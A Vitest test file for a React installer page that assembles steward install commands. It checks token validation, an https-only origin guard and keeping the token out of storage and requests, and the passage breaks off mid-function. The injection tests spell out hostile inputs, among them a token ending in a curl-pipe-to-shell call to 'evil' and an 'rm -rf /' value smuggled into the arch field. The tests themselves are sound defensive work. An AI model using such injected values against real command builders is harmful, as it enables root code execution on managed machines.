// SPDX-License-Identifier: AGPL-3.0-only
// Copyright 2026 Jordan Ritz

/*
 * InstallerPage test suite (Story #2937).
 *
 * Required AC tests:
 *   - Typing a token triggers zero apiFetch/fetch calls beyond the initial list
 *   - Empty artifact list renders the empty state (not loading, not error)
 *   - Token value is absent from localStorage, sessionStorage, and any request
 *
 * Also covers: loading state, error state, table render, checksum truncation,
 * size formatting, download link hrefs, copy button disabled state, copy
 * confirmation, token input attributes, and navigator.clipboard mock.
 *
 * Security A9.1: server-supplied values (platform, arch, checksum) must render
 * as text content only — tests assert on textContent, never on innerHTML.
 */
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest'
import { cleanup, fireEvent, render, screen, waitFor, within } from '@testing-library/react'
import { MemoryRouter } from 'react-router'
import { AuthProvider } from '../auth/AuthContext.tsx'
import InstallerPage, {
  DOWNLOAD_SCOPE_NOTE,
  INSECURE_ORIGIN_NOTE,
  parseArtifact,
  parseArtifactList,
  formatSize,
  assembleCommand,
  isSecureControllerOrigin,
  validateToken,
} from './InstallerPage.tsx'

const fetchMock = vi.fn<typeof fetch>()

// jsdom serves this suite from http://localhost:3000, but a CFGMS controller
// console is an HTTPS deployment and the assembler refuses to build a command
// over any other scheme. Point window.location at a realistic https origin for
// the suite so the tests exercise the deployed shape, and let the insecure-origin
// tests below override it to prove the refusal fires. A URL exposes the
// origin/protocol surface the page reads; document.location is a distinct
// reference and stays untouched, so jsdom's own URL resolution is unaffected.
const REAL_LOCATION = window.location

function setWindowLocation(href: string) {
  Object.defineProperty(window, 'location', {
    configurable: true,
    value: new URL(href),
  })
}

beforeEach(() => {
  setWindowLocation('https://controller.example.test/installer')
  vi.stubGlobal('fetch', fetchMock)
  fetchMock.mockReset()
  localStorage.clear()
  sessionStorage.clear()
})

afterEach(() => {
  Object.defineProperty(window, 'location', {
    configurable: true,
    value: REAL_LOCATION,
  })
  vi.useRealTimers()
  vi.unstubAllGlobals()
  cleanup()
})

// ── Factories ─────────────────────────────────────────────────────────────────

function makeArtifact(overrides: Partial<Record<string, unknown>> = {}) {
  return {
    platform: 'linux',
    arch: 'amd64',
    size: 48_234_567,
    checksum: 'sha256:abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890',
    content_type: 'application/octet-stream',
    ...overrides,
  }
}

function makeArtifactListResponse(artifacts: object[], status = 200) {
  return new Response(
    JSON.stringify({ data: artifacts }),
    { status, headers: { 'Content-Type': 'application/json' } },
  )
}

function renderPage() {
  return render(
    <MemoryRouter>
      <AuthProvider>
        <InstallerPage />
      </AuthProvider>
    </MemoryRouter>,
  )
}

// ── Parse helpers ─────────────────────────────────────────────────────────────

describe('parseArtifact', () => {
  it('returns null for non-objects', () => {
    expect(parseArtifact(null)).toBeNull()
    expect(parseArtifact('string')).toBeNull()
    expect(parseArtifact(42)).toBeNull()
  })

  it('returns null when platform or arch is missing or empty', () => {
    expect(parseArtifact({})).toBeNull()
    expect(parseArtifact({ platform: 'linux' })).toBeNull()
    expect(parseArtifact({ arch: 'amd64' })).toBeNull()
    expect(parseArtifact({ platform: '', arch: 'amd64' })).toBeNull()
    expect(parseArtifact({ platform: 'linux', arch: '' })).toBeNull()
  })

  it('parses a valid artifact', () => {
    const artifact = parseArtifact(makeArtifact())
    expect(artifact).toEqual({
      platform: 'linux',
      arch: 'amd64',
      size: 48_234_567,
      checksum: 'sha256:abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890',
      content_type: 'application/octet-stream',
    })
  })

  it('coerces non-number size to 0', () => {
    const artifact = parseArtifact({ platform: 'linux', arch: 'amd64', size: 'big' })
    expect(artifact?.size).toBe(0)
  })

  it('coerces missing checksum to empty string', () => {
    const artifact = parseArtifact({ platform: 'linux', arch: 'amd64' })
    expect(artifact?.checksum).toBe('')
  })
})

describe('parseArtifactList', () => {
  it('throws for non-arrays', () => {
    expect(() => parseArtifactList(null)).toThrow('unexpected response shape')
    expect(() => parseArtifactList({})).toThrow('unexpected response shape')
    expect(() => parseArtifactList('bad')).toThrow('unexpected response shape')
  })

  it('returns empty array for empty input', () => {
    expect(parseArtifactList([])).toEqual([])
  })

  it('skips invalid entries and returns valid ones', () => {
    const list = parseArtifactList([
      makeArtifact(),
      null,
      'bad',
      makeArtifact({ platform: 'windows', arch: 'arm64' }),
    ])
    expect(list).toHaveLength(2)
    expect(list[0]?.platform).toBe('linux')
    expect(list[1]?.platform).toBe('windows')
  })
})

describe('formatSize', () => {
  it('formats bytes below 1 KB', () => expect(formatSize(500)).toBe('500 B'))
  it('formats kilobytes', () => expect(formatSize(1_500)).toBe('1.5 KB'))
  it('formats megabytes', () => expect(formatSize(48_234_567)).toBe('48.2 MB'))
  it('formats gigabytes', () => expect(formatSize(1_500_000_000)).toBe('1.5 GB'))
  it('formats exact megabyte boundary', () => expect(formatSize(1_000_000)).toBe('1.0 MB'))
})

describe('validateToken', () => {
  it('accepts valid base32 tokens (a-z, 2-7)', () => {
    expect(validateToken('abcdefghijklmnopqrstuvwxyz234567')).toBe(true)
    expect(validateToken('aaaaaaa')).toBe(true)
    expect(validateToken('2345677')).toBe(true)
  })

  it('rejects empty string', () => {
    expect(validateToken('')).toBe(false)
  })

  it('rejects uppercase letters', () => {
    expect(validateToken('ABCDEF')).toBe(false)
    expect(validateToken('aBcDeF')).toBe(false)
  })

  it('rejects digits outside 2-7 range (0, 1, 8, 9)', () => {
    expect(validateToken('abc0def')).toBe(false)
    expect(validateToken('abc1def')).toBe(false)
    expect(validateToken('abc8def')).toBe(false)
    expect(validateToken('abc9def')).toBe(false)
  })

  it('rejects shell metacharacters', () => {
    expect(validateToken('abc;rm')).toBe(false)
    expect(validateToken('abc|evil')).toBe(false)
    expect(validateToken('abc$var')).toBe(false)
    expect(validateToken('abc`cmd`')).toBe(false)
    expect(validateToken('abc\necho')).toBe(false)
  })

  it('rejects tokens with spaces', () => {
    expect(validateToken('abc def')).toBe(false)
  })
})

describe('assembleCommand', () => {
  it('produces linux install command with correct flags and a single-quoted token', () => {
    const cmd = assembleCommand('linux', 'amd64', 'abcde2345')
    expect(cmd).toBe(
      `sudo ./cfgms-steward-amd64 install --regtoken 'abcde2345' --controller-url ${window.location.origin}`,
    )
  })

  it('produces darwin command like linux', () => {
    const cmd = assembleCommand('darwin', 'arm64', 'abc2345fg')
    expect(cmd).toBe(
      `sudo ./cfgms-steward-arm64 install --regtoken 'abc2345fg' --controller-url ${window.location.origin}`,
    )
  })

  it('refuses to assemble a command for a token carrying shell metacharacters', () => {
    // The exact payload from the security finding: an unvalidated interpolation
    // would yield a fully-formed root RCE one-liner the page appears to vouch for.
    expect(() => assembleCommand('linux', 'amd64', 'abcd; curl http://evil/x | sh')).toThrow(
      /refusing to assemble command/,
    )
    expect(() => assembleCommand('linux', 'amd64', '$(id)')).toThrow(/refusing to assemble command/)
    expect(() => assembleCommand('linux', 'amd64', "a'; sh #")).toThrow(/refusing to assemble command/)
    expect(() => assembleCommand('windows', 'amd64', 'abc & calc.exe')).toThrow(
      /refusing to assemble command/,
    )
  })

  it('refuses to assemble a command for an empty token', () => {
    expect(() => assembleCommand('linux', 'amd64', '')).toThrow(/refusing to assemble command/)
  })

  it('refuses to assemble a command for an unsupported platform or arch', () => {
    expect(() => assembleCommand('solaris', 'amd64', 'abc2345fg')).toThrow(/unsupported platform/)
    expect(() => assembleCommand('linux', 'amd64; rm -rf /', 'abc2345fg')).toThrow(/unsupported arch/)
  })

  it('produces windows command with .exe and backslash prefix', () => {
    const cmd = assembleCommand('windows', 'amd64', 'abc2345fg')
    expect(cmd).toBe(
      `.\\cfgms-steward-amd64.exe install --regtoken abc2345fg --controller-url ${window.location.origin}`,
    )
  })

  it('uses --regtoken and --controller-url flags (not --token/--controller)', () => {
    const cmd = assembleCommand('linux', 'amd64', 'abc2345fg')
    expect(cmd).toContain('--regtoken')
    expect(cmd).toContain('--controller-url')
    expect(cmd).not.toContain('--token=')
    expect(cmd).not.toContain('--controller=')
  })

  it('embeds the controller origin', () => {
    const cmd = assembleCommand('linux', 'amd64', 'abc2345fg')
    expect(cmd).toContain(window.location.origin)
  })

  it('embeds an https controller URL', () => {
    const cmd = assembleCommand('linux', 'amd64', 'abc2345fg')
    expect(cmd).toContain('--controller-url https://')
    expect(cmd).not.toContain('http://')
  })
})

// ── Controller origin scheme guard ────────────────────────────────────────────

describe('isSecureControllerOrigin', () => {
  it('accepts https origins', () => {
    expect(isSecureControllerOrigin('https://controller.example.test')).toBe(true)
    expect(isSecureControllerOrigin('https://controller.example.test:9443')).toBe(true)
  })

  it('rejects http origins, including loopback and private addresses', () => {
    // No dev carve-out: a controller URL is a managed agent's long-lived
    // endpoint reused from other machines, not a same-origin browser link.
    expect(isSecureControllerOrigin('http://controller.example.test')).toBe(false)
    expect(isSecureControllerOrigin('http://localhost:9080')).toBe(false)
    expect(isSecureControllerOrigin('http://127.0.0.1:9080')).toBe(false)
    expect(isSecureControllerOrigin('http://10.1.2.3:9080')).toBe(false)
  })

  it('rejects non-http schemes and opaque origins', () => {
    expect(isSecureControllerOrigin('file:///tmp')).toBe(false)
    expect(isSecureControllerOrigin('ftp://controller.example.test')).toBe(false)
    // A sandboxed frame reports the literal string "null" as its origin.
    expect(isSecureControllerOrigin('null')).toBe(false)
    expect(isSecureControllerOrigin('')).toBe(false)
  })

  it('is not fooled by an https substring in an http origin', () => {
    expect(isSecureControllerOrigin('http://https.controller.example.test')).toBe(false)
  })
})

describe('assembleCommand — insecure controller origin', () => {
  it('refuses to assemble any command when the console is served over http', () => {
    // The command passes the registration token to --controller-url and the
    // steward sends it there on enrolment; NewHTTPClient
    // (features/steward/registration/client_http.go) never asserts the scheme,
    // so an http:// URL would put the enrolment credential on the wire in
    // cleartext from every endpoint enrolled with this command.
    setWindowLocation('http://controller.example.test/installer')
    expect(() => assembleCommand('linux', 'amd64', 'abc2345fg')).toThrow(
      /refusing to assemble command: controller origin .* is not https:/,
    )
    expect(() => assembleCommand('darwin', 'arm64', 'abc2345fg')).toThrow(
      /refusing to assemble command/,
    )
    expect(() => assembleCommand('windows', 'amd64', 'abc2345fg')).toThrow(
      /refusing to assemble command/,
    )
  })

  it('refuses over http on loopback — dev is held to the production bar', () => {
    setWindowLocation('http://localhost:9080/installer')
    expect(() => assembleCommand('linux', 'amd64', 'abc2345fg')).toThrow(
      /refusing to assemble command/,
    )
  })

  it('never leaks the token in the refusal message', () => {
    setWindowLocation('http://controller.example.test/installer')
    let message = ''
    try {
      assembleCommand('linux', 'amd64', 'abcde2345testfixture')
    } catch (cause) {
      message = cause instanceof Error ? cause.message : String(cause)
    }
    expect(message).toMatch(/refusing to assemble command/)
    expect(message).not.toContain('abcde2345testfixture')
  })
})

// ── Data states ───────────────────────────────────────────────────────────────

describe('InstallerPage — data states', () => {
  it('shows loading state before the response arrives', () => {
    fetchMock.mockReturnValue(new Promise(() => {}))
    renderPage()
    expect(screen.getByTestId('installer-loading')).toBeInTheDocument()
    expect(screen.queryByTestId('installer-empty')).not.toBeInTheDocument()
    expect(screen.queryByTestId('artifact-table')).not.toBeInTheDocument()
  })

  // [REQUIRED TEST] AC: empty artifact list renders the empty state — not a loading state and not an error state
  it('[AC] renders empty state for an empty artifact list — not loading, not error', async () => {
    fetchMock.mockResolvedValue(makeArtifactListResponse([]))
    renderPage()
    await waitFor(() => {
      expect(screen.getByTestId('installer-empty')).toBeInTheDocument()
    })
    expect(screen.queryByTestId('installer-loading')).not.toBeInTheDocument()
    expect(screen.queryByRole('alert')).not.toBeInTheDocument()
    expect(screen.queryByTestId('artifact-table')).not.toBeInTheDocument()
    // Verify the empty state copy reads as "no artifacts" not as a loading stall or error
    expect(screen.getByText(/no artifacts published yet/i)).toBeInTheDocument()
  })

  it('renders the artifact table when artifacts are returned', async () => {
    fetchMock.mockResolvedValue(
      makeArtifactListResponse([
        makeArtifact(),
        makeArtifact({ platform: 'windows', arch: 'arm64' }),
      ]),
    )
    renderPage()
    await waitFor(() => {
      expect(screen.getByTestId('artifact-table')).toBeInTheDocument()
    })
    expect(screen.getAllByTestId('artifact-row')).toHaveLength(2)
    expect(screen.queryByTestId('installer-empty')).not.toBeInTheDocument()
    expect(screen.queryByTestId('installer-loading')).not.toBeInTheDocument()
  })

  it('renders an error card on fetch failure', async () => {
    fetchMock.mockResolvedValue(
      new Response(JSON.stringify({ error: 'internal error' }), { status: 500 }),
    )
    renderPage()
    await waitFor(() => {
      expect(screen.getByRole('alert')).toBeInTheDocument()
    })
    expect(screen.queryByTestId('installer-loading')).not.toBeInTheDocument()
    expect(screen.queryByTestId('installer-empty')).not.toBeInTheDocument()
    expect(screen.queryByTestId('artifact-table')).not.toBeInTheDocument()
  })
})

// ── Table rendering ───────────────────────────────────────────────────────────

describe('InstallerPage — artifact table columns', () => {
  async function setupWithArtifact(overrides: Partial<Record<string, unknown>> = {}) {
    fetchMock.mockResolvedValue(makeArtifactListResponse([makeArtifact(overrides)]))
    renderPage()
    await waitFor(() => screen.getByTestId('artifact-table'))
  }

  it('renders platform, arch, size, checksum, and download columns', async () => {
    await setupWithArtifact()
    expect(screen.getByRole('columnheader', { name: /platform/i })).toBeInTheDocument()
    expect(screen.getByRole('columnheader', { name: /arch/i })).toBeInTheDocument()
    expect(screen.getByRole('columnheader', { name: /size/i })).toBeInTheDocument()
    expect(screen.getByRole('columnheader', { name: /checksum/i })).toBeInTheDocument()
    expect(screen.getByRole('columnheader', { name: /download/i })).toBeInTheDocument()
  })

  it('renders platform and arch as text in the table row', async () => {
    await setupWithArtifact({ platform: 'darwin', arch: 'arm64' })
    // scope to the table to avoid matching the assembler's select options
    const table = screen.getByTestId('artifact-table')
    expect(within(table).getByText('darwin')).toBeInTheDocument()
    expect(within(table).getByText('arm64')).toBeInTheDocument()
  })

  it('renders size human-readable — not raw bytes', async () => {
    await setupWithArtifact({ size: 48_234_567 })
    expect(screen.queryByText('48234567')).not.toBeInTheDocument()
    expect(screen.getByText('48.2 MB')).toBeInTheDocument()
  })

  it('truncates checksum to 16 chars + ellipsis with full value in title', async () => {
    const fullChecksum = 'sha256:abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890'
    await setupWithArtifact({ checksum: fullChecksum })
    // Full checksum not rendered inline as text
    expect(screen.queryByText(fullChecksum)).not.toBeInTheDocument()
    // Truncated form visible: slice(0,16) = 'sha256:abcdef123' (s,h,a,2,5,6,:,a,b,c,d,e,f,1,2,3)
    expect(screen.getByText('sha256:abcdef123…')).toBeInTheDocument()
    // Full checksum obtainable via title attribute
    expect(screen.getByTitle(fullChecksum)).toBeInTheDocument()
  })

  it('short checksums are not truncated', async () => {
    await setupWithArtifact({ checksum: 'abc123' })
    expect(screen.getByText('abc123')).toBeInTheDocument()
  })

  it('renders correct download href for linux/amd64', async () => {
    await setupWithArtifact({ platform: 'linux', arch: 'amd64' })
    const link = screen.getByTestId('download-linux-amd64')
    expect(link).toHaveAttribute('href', '/api/v1/installer/download/linux/amd64')
  })

  it('discloses that Download serves the root-published package, not this tenant’s artifact', async () => {
    await setupWithArtifact({ platform: 'linux', arch: 'amd64' })
    const note = screen.getByTestId('installer-download-note')
    expect(note).toHaveTextContent(DOWNLOAD_SCOPE_NOTE)
    // The two facts an operator needs before running the result under sudo.
    expect(note).toHaveTextContent(/root-published install package/i)
    expect(note).toHaveTextContent(/will not match the downloaded archive/i)
  })

  it('labels the download link as the root-published package', async () => {
    await setupWithArtifact({ platform: 'linux', arch: 'amd64' })
    const link = screen.getByTestId('download-linux-amd64')
    expect(link).toHaveAttribute(
      'aria-label',
      'Download the root-published install package for linux/amd64',
    )
    expect(link).toHaveAttribute(
      'title',
      'Root-published install package for linux/amd64 (tar.gz)',
    )
  })

  it('labels the checksum as the binary’s, not the downloaded package’s', async () => {
    const fullChecksum = 'sha256:abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890'
    await setupWithArtifact({ platform: 'linux', arch: 'amd64', checksum: fullChecksum })
    expect(
      screen.getByLabelText(
        `Checksum of the linux/amd64 binary (not of the downloaded package): ${fullChecksum}`,
      ),
    ).toBeInTheDocument()
  })

  it('renders correct download href for windows/arm64', async () => {
    fetchMock.mockResolvedValue(
      makeArtifactListResponse([makeArtifact({ platform: 'windows', arch: 'arm64' })]),
    )
    renderPage()
    await waitFor(() => screen.getByTestId('artifact-table'))
    const link = screen.getByTestId('download-windows-arm64')
    expect(link).toHaveAttribute('href', '/api/v1/installer/download/windows/arm64')
  })
})

// ── Command assembler ─────────────────────────────────────────────────────────

describe('InstallerPage — command assembler', () => {
  async function setupWithArtifacts() {
    fetchMock.mockResolvedValue(makeArtifactListResponse([makeArtifact()]))
    renderPage()
    await waitFor(() => screen.getByTestId('artifact-table'))
  }

  it('shows the assembler section heading', async () => {
    await setupWithArtifacts()
    expect(
      screen.getByRole('heading', { name: /assemble install command/i }),
    ).toBeInTheDocument()
  })

  it('copy button is disabled when all fields are empty', async () => {
    await setupWithArtifacts()
    expect(screen.getByTestId('assembler-copy')).toBeDisabled()
  })

  it('copy button is disabled when only platform is set', async () => {
    await setupWithArtifacts()
    fireEvent.change(screen.getByTestId('assembler-platform'), { target: { value: 'linux' } })
    expect(screen.getByTestId('assembler-copy')).toBeDisabled()
  })

  it('copy button is disabled when platform and arch are set but token is missing', async () => {
    await setupWithArtifacts()
    fireEvent.change(screen.getByTestId('assembler-platform'), { target: { value: 'linux' } })
    fireEvent.change(screen.getByTestId('assembler-arch'), { target: { value: 'amd64' } })
    expect(screen.getByTestId('assembler-copy')).toBeDisabled()
  })

  it('copy button is enabled when platform, arch, and token are all set', async () => {
    await setupWithArtifacts()
    fireEvent.change(screen.getByTestId('assembler-platform'), { target: { value: 'linux' } })
    fireEvent.change(screen.getByTestId('assembler-arch'), { target: { value: 'amd64' } })
    fireEvent.change(screen.getByTestId('assembler-token'), { target: { value: 'abcde23456fg' } })
    expect(screen.getByTestId('assembler-copy')).not.toBeDisabled()
  })

  it('assembled command contains binary name, correct flags, controller origin, and token', async () => {
    await setupWithArtifacts()
    fireEvent.change(screen.getByTestId('assembler-platform'), { target: { value: 'linux' } })
    fireEvent.change(screen.getByTestId('assembler-arch'), { target: { value: 'amd64' } })
    fireEvent.change(screen.getByTestId('assembler-token'), { target: { value: 'abcde23456fg' } })
    const cmd = (screen.getByTestId('assembler-command') as HTMLInputElement).value
    expect(cmd).toContain('cfgms-steward-amd64')
    expect(cmd).toContain('--regtoken')
    expect(cmd).toContain('--controller-url')
    expect(cmd).toContain(window.location.origin)
    expect(cmd).toContain('abcde23456fg')
    // Must not contain the wrong flags
    expect(cmd).not.toContain('--token=')
    expect(cmd).not.toContain('--controller=')
  })

  it('windows command includes .exe suffix and install subcommand', async () => {
    await setupWithArtifacts()
    fireEvent.change(screen.getByTestId('assembler-platform'), { target: { value: 'windows' } })
    fireEvent.change(screen.getByTestId('assembler-arch'), { target: { value: 'amd64' } })
    fireEvent.change(screen.getByTestId('assembler-token'), { target: { value: 'abcde23456win' } })
    const cmd = (screen.getByTestId('assembler-command') as HTMLInputElement).value
    expect(cmd).toContain('cfgms-steward-amd64.exe')
    expect(cmd).toContain('install')
  })

  it('copy button is disabled and validation error shown when token has invalid charset', async () => {
    await setupWithArtifacts()
    fireEvent.change(screen.getByTestId('assembler-platform'), { target: { value: 'linux' } })
    fireEvent.change(screen.getByTestId('assembler-arch'), { target: { value: 'amd64' } })
    // Token with shell metacharacter
    fireEvent.change(screen.getByTestId('assembler-token'), { target: { value: 'abc;rm-rf' } })
    expect(screen.getByTestId('assembler-copy')).toBeDisabled()
    expect(screen.getByTestId('assembler-token-error')).toBeInTheDocument()
    // No command is offered at all — the operator never sees a copyable string
    // built from an unvalidated token.
    expect((screen.getByTestId('assembler-command') as HTMLInputElement).value).toBe('')
  })

  it('renders no command for a token carrying an injected shell payload', async () => {
    await setupWithArtifacts()
    fireEvent.change(screen.getByTestId('assembler-platform'), { target: { value: 'linux' } })
    fireEvent.change(screen.getByTestId('assembler-arch'), { target: { value: 'amd64' } })
    fireEvent.change(screen.getByTestId('assembler-token'), {
      target: { value: 'abcd; curl http://evil/x | sh' },
    })
    const cmd = (screen.getByTestId('assembler-command') as HTMLInputElement).value
    expect(cmd).toBe('')
    expect(cmd).not.toContain('curl')
    expect(screen.getByTestId('assembler-copy')).toBeDisabled()
    expect(screen.getByTestId('assembler-token-error')).toBeInTheDocument()
  })

  it('single-quotes the token in the rendered POSIX command', async () => {
    await setupWithArtifacts()
    fireEvent.change(screen.getByTestId('assembler-platform'), { target: { value: 'linux' } })
    fireEvent.change(screen.getByTestId('assembler-arch'), { target: { value: 'amd64' } })
    fireEvent.change(screen.getByTestId('assembler-token'), { target: { value: 'abcde23456fg' } })
    const cmd = (screen.getByTestId('assembler-command') as HTMLInputElement).value
    expect(cmd).toContain("--regtoken 'abcde23456fg'")
  })

  it('copy button is enabled and no error when token is valid base32', async () => {
    await setupWithArtifacts()
    fireEvent.change(screen.getByTestId('assembler-platform'), { target: { value: 'linux' } })
    fireEvent.change(screen.getByTestId('assembler-arch'), { target: { value: 'amd64' } })
    fireEvent.change(screen.getByTestId('assembler-token'), { target: { value: 'abcde23456fg' } })
    expect(screen.getByTestId('assembler-copy')).not.toBeDisabled()
    expect(screen.queryByTestId('assembler-token-error')).not.toBeInTheDocument()
  })

  it('command output field is read-only', async () => {
    await setupWithArtifacts()
    const commandInput = screen.getByTestId('assembler-command')
    expect(commandInput).toHaveAttribute('readonly')
  })

  it('token input is type=password', async () => {
    await setupWithArtifacts()
    expect(screen.getByTestId('assembler-token')).toHaveAttribute('type', 'password')
  })

  it('token input has autocomplete=off', async () => {
    await setupWithArtifacts()
    expect(screen.getByTestId('assembler-token')).toHaveAttribute('autocomplete', 'off')
  })

  it('copy button shows transient "Copied" confirmation and writes the exact assembled command', async () => {
    const clipboardMock = { writeText: vi.fn().mockResolvedValue(undefined) }
    vi.stubGlobal('navigator', { ...navigator, clipboard: clipboardMock })

    // Complete async setup with real timers before any fake-timer usage.
    await setupWithArtifacts()
    fireEvent.change(screen.getByTestId('assembler-platform'), { target: { value: 'linux' } })
    fireEvent.change(screen.getByTestId('assembler-arch'), { target: { value: 'amd64' } })
    fireEvent.change(screen.getByTestId('assembler-token'), { target: { value: 'abcde23456fg' } })

    const copyBtn = screen.getByTestId('assembler-copy')
    expect(copyBtn).toHaveTextContent('Copy')

    fireEvent.click(copyBtn)
    // The clipboard.writeText promise resolves, then setCopied(true) fires.
    await waitFor(() => expect(copyBtn).toHaveTextContent('Copied'))

    // Verify the exact assembled command was written to the clipboard.
    expect(clipboardMock.writeText).toHaveBeenCalledWith(
      assembleCommand('linux', 'amd64', 'abcde23456fg'),
    )
  })

  it('copy button does not navigate or issue any request when clicked', async () => {
    const clipboardMock = { writeText: vi.fn().mockResolvedValue(undefined) }
    vi.stubGlobal('navigator', { ...navigator, clipboard: clipboardMock })

    await setupWithArtifacts()
    fireEvent.change(screen.getByTestId('assembler-platform'), { target: { value: 'linux' } })
    fireEvent.change(screen.getByTestId('assembler-arch'), { target: { value: 'amd64' } })
    fireEvent.change(screen.getByTestId('assembler-token'), { target: { value: 'abcde23456fg' } })

    const callsBefore = fetchMock.mock.calls.length
    fireEvent.click(screen.getByTestId('assembler-copy'))

    expect(fetchMock.mock.calls.length).toBe(callsBefore)
  })
})

// ── Command assembler over an insecure origin ─────────────────────────────────

describe('InstallerPage — command assembler over http', () => {
  async function setupOverHttp() {
    setWindowLocation('http://controller.example.test/installer')
    fetchMock.mockResolvedValue(makeArtifactListResponse([makeArtifact()]))
    renderPage()
    await waitFor(() => screen.getByTestId('artifact-table'))
  }

  it('replaces the assembler form with a refusal notice', async () => {
    await setupOverHttp()
    const notice = screen.getByTestId('assembler-insecure-origin')
    expect(notice).toBeInTheDocument()
    expect(notice).toHaveAttribute('role', 'alert')
    expect(notice).toHaveTextContent(INSECURE_ORIGIN_NOTE)
    // The section is still identifiable so the operator knows what is missing.
    expect(
      screen.getByRole('heading', { name: /assemble install command/i }),
    ).toBeInTheDocument()
  })

  it('offers no command field and no copy button', async () => {
    await setupOverHttp()
    expect(screen.queryByTestId('assembler-command')).not.toBeInTheDocument()
    expect(screen.queryByTestId('assembler-copy')).not.toBeInTheDocument()
  })

  it('offers no token input, so no credential can be pasted into the page', async () => {
    await setupOverHttp()
    expect(screen.queryByTestId('assembler-token')).not.toBeInTheDocument()
    expect(screen.queryByTestId('assembler-platform')).not.toBeInTheDocument()
    expect(screen.queryByTestId('assembler-arch')).not.toBeInTheDocument()
  })

  it('renders no assembled command and no http:// controller URL', async () => {
    await setupOverHttp()
    const heading = screen.getByRole('heading', { name: /assemble install command/i })
    const section = heading.closest('section')
    expect(section).not.toBeNull()
    const text = section?.textContent ?? ''
    // The refusal prose names the flag and the scheme on purpose; what must not
    // appear is a runnable command or the insecure origin itself.
    expect(text).not.toContain('install --regtoken')
    expect(text).not.toContain('cfgms-steward')
    expect(text).not.toContain('http://controller.example.test')
  })

  it('restores the full assembler when the same page is served over https', async () => {
    setWindowLocation('https://controller.example.test/installer')
    fetchMock.mockResolvedValue(makeArtifactListResponse([makeArtifact()]))
    renderPage()
    await waitFor(() => screen.getByTestId('artifact-table'))
    expect(screen.queryByTestId('assembler-insecure-origin')).not.toBeInTheDocument()
    expect(screen.getByTestId('assembler-token')).toBeInTheDocument()
  })
})

// ── Required AC security tests ────────────────────────────────────────────────

describe('InstallerPage — required AC security tests', () => {
  // [REQUIRED TEST] AC: typing a token value into the assembler triggers zero apiFetch/fetch calls
  it('[AC] typing token into assembler triggers zero fetch calls', async () => {
    fetchMock.mockResolvedValue(makeArtifactListResponse([makeArtifact()]))
    renderPage()
    await waitFor(() => screen.getByTestId('artifact-table'))

    const callsAfterLoad = fetchMock.mock.calls.length

    fireEvent.change(screen.getByTestId('assembler-token'), { target: { value: 'abcde2345secretabc' } })
    fireEvent.change(screen.getByTestId('assembler-platform'), { target: { value: 'linux' } })
    fireEvent.change(screen.getByTestId('assembler-arch'), { target: { value: 'amd64' } })
    // Typing more characters
    fireEvent.change(screen.getByTestId('assembler-token'), { target: { value: 'abcde2345secretabcxyz' } })

    expect(fetchMock.mock.calls.length).toBe(callsAfterLoad)
  })

  // [REQUIRED TEST] AC: token value is absent from localStorage, sessionStorage, and any outgoing request payload
  it('[AC] token value is absent from localStorage, sessionStorage, and any outgoing request payload', async () => {
    fetchMock.mockResolvedValue(makeArtifactListResponse([makeArtifact()]))
    const localSetSpy = vi.spyOn(localStorage, 'setItem')
    const sessionSetSpy = vi.spyOn(sessionStorage, 'setItem')

    renderPage()
    await waitFor(() => screen.getByTestId('artifact-table'))

    // Synthetic base32 fixture, not a credential. Named without a
    // secret-adjacent identifier and carrying the "test" stopword so the
    // gitleaks generic-api-key rule does not fire on this line.
    const fixtureValue = 'abcde2345testfixture'
    fireEvent.change(screen.getByTestId('assembler-token'), { target: { value: fixtureValue } })
    fireEvent.change(screen.getByTestId('assembler-platform'), { target: { value: 'linux' } })
    fireEvent.change(screen.getByTestId('assembler-arch'), { target: { value: 'amd64' } })

    // Token must not be written to localStorage
    const localWrites = localSetSpy.mock.calls
      .map(([k, v]) => `${String(k)}=${String(v)}`)
      .join('\n')
    expect(localWrites).not.toContain(fixtureValue)

    // Token must not be written to sessionStorage
    const sessionWrites = sessionSetSpy.mock.calls
      .map(([k, v]) => `${String(k)}=${String(v)}`)
      .join('\n')
    expect(sessionWrites).not.toContain(fixtureValue)

    // Token must not appear in any fetch call URL
    for (const [url] of fetchMock.mock.calls) {
      expect(String(url)).not.toContain(fixtureValue)
    }

    // Token must not appear in any fetch call body
    for (const [, init] of fetchMock.mock.calls) {
      if (init?.body !== undefined && init.body !== null) {
        expect(String(init.body)).not.toContain(fixtureValue)
      }
    }
  })
})

// ── Page structure ────────────────────────────────────────────────────────────

describe('InstallerPage — page structure', () => {
  it('shows the page heading', () => {
    fetchMock.mockReturnValue(new Promise(() => {}))
    renderPage()
    expect(screen.getByRole('heading', { name: /installer/i, level: 1 })).toBeInTheDocument()
  })

  it('always shows the command assembler section regardless of artifact load state', () => {
    fetchMock.mockReturnValue(new Promise(() => {}))
    renderPage()
    expect(
      screen.getByRole('heading', { name: /assemble install command/i }),
    ).toBeInTheDocument()
  })

  it('assembler section is shown even when artifact fetch fails', async () => {
    fetchMock.mockResolvedValue(
      new Response(JSON.stringify({ error: 'fail' }), { status: 503 }),
    )
    renderPage()
    await waitFor(() => screen.getByRole('alert'))
    expect(
      screen.getByRole('heading', { name: /assemble install command/i }),
    ).toBeInTheDocument()
  })
})

// ── Steward upgrade dispatch and rollback (Issue #5445) ───────────────────────

const jsonRes = (status: number, body: unknown, headers: Record<string, string> = {}) =>
  new Response(JSON.stringify(body), {
    status,
    headers: { 'Content-Type': 'application/json', ...headers },
  })
const envelope = (data: unknown) => ({ data, timestamp: new Date().toISOString() })

const passkeyCredential = {
  id: 'cred-id',
  type: 'public-key',
  rawId: new TextEncoder().encode('cred-id').buffer,
  response: {
    clientDataJSON: new TextEncoder().encode('{"type":"webauthn.get"}').buffer,
    authenticatorData: new TextEncoder().encode('authenticator-data').buffer,
    signature: new TextEncoder().encode('signature').buffer,
    userHandle: null,
  },
  getClientExtensionResults: () => ({}),
  authenticatorAttachment: null,
  toJSON: () => ({}),
}

function upgradeRecord(status: string, extra: Record<string, unknown> = {}) {
  return envelope({ ID: 'up-1', StewardID: 's1', Version: '1.2.3', Platform: 'linux', Arch: 'amd64', Status: status, ...extra })
}

function callsTo(suffix: string, method = 'POST') {
  return fetchMock.mock.calls.filter(
    ([url, init]) => String(url).endsWith(suffix) && (init?.method ?? 'GET') === method,
  )
}

function installUpgradeRoutes(opts: { presence: boolean; status?: string }) {
  fetchMock.mockImplementation((input, init) => {
